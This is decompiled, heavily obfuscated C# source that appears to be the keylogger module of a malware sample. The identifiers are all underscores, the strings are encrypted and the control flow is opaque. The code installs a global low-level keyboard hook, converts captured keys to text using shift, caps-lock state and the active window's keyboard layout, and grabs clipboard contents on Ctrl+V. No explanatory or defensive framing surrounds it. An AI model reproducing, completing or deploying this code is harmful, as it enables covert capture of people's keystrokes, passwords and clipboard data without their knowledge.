using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

public class ________________________________________
{
	public delegate void ___________________________________________(Keys keys_0);

	public delegate void ____________________________________________(Keys keys_0);

	public delegate void _____________________________________________(string string_0);

	private delegate int __________________________________________(int int_0, int int_1, ref _________________________________________ __________________________________________0);

	private struct _________________________________________
	{
		public int _;

		public int __;

		public int ___;

		public int ____;

		public int _____;
	}

	private static int ____;

	private static __________________________________________ _____;

	public event ___________________________________________ _;

	public event ____________________________________________ __;

	public event _____________________________________________ ___;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int int_0, __________________________________________ ___________________________________________0, int int_1, int int_2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int int_0, int int_1, int int_2, _________________________________________ __________________________________________0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int int_0, [MarshalAs(UnmanagedType.AnsiBStr)] ref string string_0, int int_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	public void ______________()
	{
		try
		{
			_____ = _______________;
			____ = SetWindowsHookExA(13, _____, (int)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
			if (____ == 0)
			{
				IntPtr intPtr = (IntPtr)Conversions.ToLong(Environment.GetCommandLineArgs()[1]);
				_____ = _______________;
				____ = SetWindowsHookExA(13, _____, (int)intPtr, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private unsafe int _______________(int int_0, int int_1, ref _________________________________________ __________________________________________0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		___________________________________________ __________________________________________ = default(___________________________________________);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 280:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0025;
						case 9:
						case 10:
							goto IL_004e;
						case 5:
						case 7:
							goto IL_0079;
						case 4:
						case 8:
						case 11:
						case 12:
						case 13:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a3:
					__________________________________________((Keys)__________________________________________0._);
					break;
					IL_0008:
					num = 2;
					if (int_0 != 0)
					{
						break;
					}
					if (sizeof(uint) + 17314 != 19099)
					{
						goto IL_0025;
					}
					goto IL_00a3;
					IL_0079:
					num = 7;
					__________________________________________ = this._;
					if (__________________________________________ == null)
					{
						break;
					}
					num5 = sizeof(byte) + -1;
					goto IL_005c;
					IL_0025:
					num = 3;
					switch (int_1)
					{
					case 257:
					case 261:
						break;
					case 256:
					case 260:
						goto IL_0079;
					default:
						goto end_IL_0000_2;
					}
					goto IL_004e;
					IL_004e:
					num = 10;
					num5 = 2;
					goto IL_005c;
					IL_005c:
					switch (num5)
					{
					case 2:
						goto IL_0088;
					case 0:
						goto IL_00a3;
					}
					goto IL_0079;
					IL_0088:
					this.__?.Invoke((Keys)__________________________________________0._);
					break;
					end_IL_0000_2:
					break;
				}
				num = 13;
				num6 = CallNextHookEx(____, int_0, int_1, __________________________________________0);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 280;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		int result = num6;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public unsafe string ________________(Keys keys_0)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Invalid comparison between Unknown and I4
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Invalid comparison between Unknown and I4
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Invalid comparison between Unknown and I4
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Invalid comparison between Unknown and I4
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Invalid comparison between Unknown and I4
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Invalid comparison between Unknown and I4
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Invalid comparison between Unknown and I4
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Invalid comparison between Unknown and I4
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Invalid comparison between Unknown and I4
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bc: Invalid comparison between Unknown and I4
		//IL_01c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Invalid comparison between Unknown and I4
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Invalid comparison between Unknown and I4
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Invalid comparison between Unknown and I4
		//IL_01de: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Invalid comparison between Unknown and I4
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f9: Invalid comparison between Unknown and I4
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_0203: Invalid comparison between Unknown and I4
		//IL_0247: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a4: Invalid comparison between Unknown and I4
		//IL_02a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Invalid comparison between Unknown and I4
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e2: Invalid comparison between Unknown and I4
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Invalid comparison between Unknown and I4
		//IL_02f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f2: Invalid comparison between Unknown and I4
		//IL_0316: Unknown result type (might be due to invalid IL or missing references)
		//IL_0319: Invalid comparison between Unknown and I4
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_037f: Invalid comparison between Unknown and I4
		//IL_038e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0394: Invalid comparison between Unknown and I4
		//IL_0399: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Invalid comparison between Unknown and I4
		//IL_03a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a7: Invalid comparison between Unknown and I4
		//IL_041c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0421: Unknown result type (might be due to invalid IL or missing references)
		//IL_0485: Unknown result type (might be due to invalid IL or missing references)
		//IL_048b: Expected I4, but got Unknown
		//IL_0497: Unknown result type (might be due to invalid IL or missing references)
		//IL_049d: Expected I4, but got Unknown
		//IL_06a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06aa: Expected I4, but got Unknown
		//IL_06c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c7: Expected I4, but got Unknown
		bool flag = false;
		try
		{
			string result = default(string);
			if (-7570 != (nint)Type.EmptyTypes.LongLength + -7571)
			{
				Keys val = default(Keys);
				int num3 = default(int);
				int num5 = default(int);
				int num2 = default(int);
				int num6 = default(int);
				int num10 = default(int);
				while (true)
				{
					flag = ((Computer)_____________._).get_Keyboard().get_ShiftKeyDown();
					int num;
					if (((Computer)_____________._).get_Keyboard().get_CapsLock())
					{
						num = 23401;
						if (sizeof(short) + 8684 != 8686)
						{
							return result;
						}
						goto IL_0096;
					}
					goto IL_00be;
					IL_0676:
					return _003CModule_003E.__________(64471, 65289, (int)((nint)Type.EmptyTypes.LongLength + 136));
					IL_04f0:
					return _003CModule_003E.______<string>(2263034367u);
					IL_00be:
					num = 30402;
					if (!((Computer)_____________._).get_Keyboard().get_CtrlKeyDown())
					{
						val = keys_0;
						if ((int)val != 112 && (int)val != 113)
						{
							num = -9029;
							if ((((0x1800 & ((uint)num2 / 16u) & (((uint)num2 / 5398644u) ^ 0x21DC)) == 0) ? 5978 : ((nint)Type.EmptyTypes.LongLength + -1471801026)) != 420)
							{
								if ((int)val == 114 || (int)val == 115 || (int)val == 116)
								{
									goto IL_0676;
								}
								num3 = num;
								num = 31054;
								if (num3 != -9029)
								{
									goto IL_0096;
								}
							}
							goto IL_00de;
						}
						goto IL_0676;
					}
					if ((int)keys_0 == 86)
					{
						if (num != -1942)
						{
							goto IL_0406;
						}
						return result;
					}
					result = null;
					nint num4 = (nint)Type.EmptyTypes.LongLength + 4;
					goto IL_03c2;
					IL_0406:
					return ((Computer)_____________._).get_Clipboard().GetText();
					IL_0096:
					if (flag)
					{
						flag = false;
					}
					else
					{
						flag = true;
						num = 30402;
						if ((nint)Type.EmptyTypes.LongLength + 23401 != 23401)
						{
							goto IL_00de;
						}
					}
					goto IL_00be;
					IL_045b:
					if (flag)
					{
						num = 28804;
						num5 = _003CModule_003E._________________;
						if ((-8874 | -(num5 << 18)) == -8874)
						{
							return _________________((uint)(int)keys_0).ToUpper();
						}
						return result;
					}
					result = _________________((uint)(int)keys_0);
					num = 2994;
					if ((((0x17FF | num5) * 193 + (0x17FF | num5) * 831 != 7575) ? ((nint)Type.EmptyTypes.LongLength + 28804) : ((nint)Type.EmptyTypes.LongLength + -1264206385)) != 22909)
					{
						break;
					}
					goto IL_04f0;
					IL_00de:
					if ((int)val != 117 && (int)val != 118 && (int)val != 119)
					{
						if (num == 5182 && (0x377 & (num6 * 816128)) == 0)
						{
							continue;
						}
						if ((int)val != 120 && (int)val != 121 && (int)val != 122)
						{
							num = (int)((nint)Type.EmptyTypes.LongLength + 31768);
							num4 = (nint)Type.EmptyTypes.LongLength + 5;
							goto IL_03c2;
						}
					}
					goto IL_0676;
					IL_03c2:
					while (true)
					{
						switch (num4)
						{
						case 5:
							break;
						case 3:
							goto IL_01f6;
						case 1:
							goto IL_0316;
						case 2:
							goto IL_038e;
						case 0:
							return _003CModule_003E.___<string>(1199096694u);
						default:
							return result;
						case 4:
							return result;
						}
						if ((int)val != 123 && (int)val != 35)
						{
							if ((int)val != 46)
							{
								if ((int)val != 160 && (int)val != 161)
								{
									num4 = (nint)Type.EmptyTypes.LongLength + 2;
									continue;
								}
								goto IL_0526;
							}
							if (-87703552 * num != -1846826231 && num == -21893)
							{
								return result;
							}
						}
						goto IL_0676;
						IL_038e:
						if ((int)val != 65536 && (int)val != 16 && (int)val != 131072)
						{
							num = (int)((nint)Type.EmptyTypes.LongLength + -11143);
							num4 = (nint)Type.EmptyTypes.LongLength + 1;
							continue;
						}
						goto IL_0526;
						IL_0526:
						nint num7 = (nint)Type.EmptyTypes.LongLength + 4943;
						num2 = ___________._;
						nint num9;
						if ((1 & ((uint)(num2 - 728) >> 2)) == (1 & ((uint)num2 / 4u)))
						{
							int num8 = ___________._;
							num9 = (((1 & (num8 + num8 + 2682)) == 0) ? (sizeof(int) + 6178) : ((-(num6 << 30) == -1874483982) ? ((nint)Type.EmptyTypes.LongLength + 838701997) : (sizeof(float) + -611690294)));
						}
						else
						{
							num10 = _003CModule_003E.______________;
							if ((0x1800 & ((uint)num10 / 16u) & (((uint)num10 / 5398644u) ^ 0x21DC)) == 0)
							{
								if (num2 * 392276584 != 1227611933)
								{
									if ((((uint)num2 % 443397530u) & 0xE0000000u) == 0)
									{
										num6 = _003CModule_003E.__________;
										num9 = ((((uint)(6720 + (-5255 & num6)) ^ 0x86CF04D2u) != 0) ? 768007366 : (sizeof(ushort) + 809641983));
									}
									else
									{
										num9 = sizeof(long) + -2050816193;
									}
								}
								else
								{
									num9 = (nint)Type.EmptyTypes.LongLength + -1133953397;
								}
							}
							else
							{
								num9 = -759032824;
							}
						}
						return _003CModule_003E.__________((int)num7, (int)num9, (int)((~((uint)num2 / 299630u % 2048u) == (uint)(-(num2 * 14476) * 262144)) ? ((nint)Type.EmptyTypes.LongLength + 1028596853) : 130));
						IL_0316:
						while ((int)val != 17 && (int)val != 163 && (int)val != 162)
						{
							if (num != -11143 || 8 * num2 - 4701 + 649579720 == -num2 << 3)
							{
								goto IL_0406;
							}
							if ((int)val == 262144)
							{
								break;
							}
							if ((int)val == 32)
							{
								goto IL_0323;
							}
							if ((int)val != 8)
							{
								goto IL_037c;
							}
							num = 32260;
							if ((nint)Type.EmptyTypes.LongLength + -12443 == -9535)
							{
								continue;
							}
							goto IL_04f0;
						}
						goto IL_0526;
						IL_0323:
						num4 = (((((uint)(-(-1358080 * num10)) >> 8) & 1) != (uint)(1 & num10)) ? (sizeof(ulong) + 913001722) : (((0x97 & (-1390 + num3 * 16 + 1008 * num3)) != 146) ? (sizeof(ushort) + 1743121200) : (sizeof(ushort) + -2)));
						continue;
						IL_01f6:
						if ((int)val == 13)
						{
							break;
						}
						if ((int)val == 9)
						{
							num = -22203;
							int num11 = _003CModule_003E._______________;
							if (((~(-(num11 * -1503395840)) != 262144 * num11) ? (-474) : ((nint)Type.EmptyTypes.LongLength + -1428370030)) != 25251)
							{
								if (_______________________________________.__ != keys_0)
								{
									return _003CModule_003E._____<string>(434313728u);
								}
								result = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 50484), (int)((nint)Type.EmptyTypes.LongLength + 50699), (int)((nint)Type.EmptyTypes.LongLength + 242));
								if (((num6 + num6 * 3) | -2) != -2)
								{
									return result;
								}
								if (num != -24067)
								{
									return result;
								}
							}
							goto IL_0316;
						}
						goto IL_045b;
						IL_037c:
						if ((int)val == 13)
						{
							break;
						}
						num4 = (nint)Type.EmptyTypes.LongLength + 3;
					}
					if (_______________________________________.__ == keys_0)
					{
						return _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 17383), 18083, (int)((nint)Type.EmptyTypes.LongLength + 17));
					}
					return _003CModule_003E._______<string>(1043067638u);
				}
				return result;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				string result;
				if (flag)
				{
					result = Strings.ChrW((int)keys_0).ToString().ToUpper();
					ProjectData.ClearProjectError();
					return result;
				}
				result = Strings.ChrW((int)keys_0).ToString().ToLower();
				ProjectData.ClearProjectError();
				return result;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private unsafe static string _________________(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			_003CModule_003E._____ = null;
			int num = _003CModule_003E._____________;
			uint uint_ = default(uint);
			IntPtr foregroundWindow = default(IntPtr);
			if ((int)((uint)num / 1518670u) - -536870912 != (int)((uint)num / 1048576u * 256))
			{
				if (!GetKeyboardState(byte_))
				{
					string result = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 27780), sizeof(byte) + 28334, 90);
					switch (sizeof(double))
					{
					case 7:
						break;
					default:
						return result;
					}
				}
				else
				{
					uint_ = MapVirtualKey(uint_0, 0u);
					foregroundWindow = GetForegroundWindow();
				}
			}
			int int_ = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref int_);
			IntPtr intptr_ = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)uint_0).ToString();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_0);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_0, uint uint_2, IntPtr intptr_0);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);
}
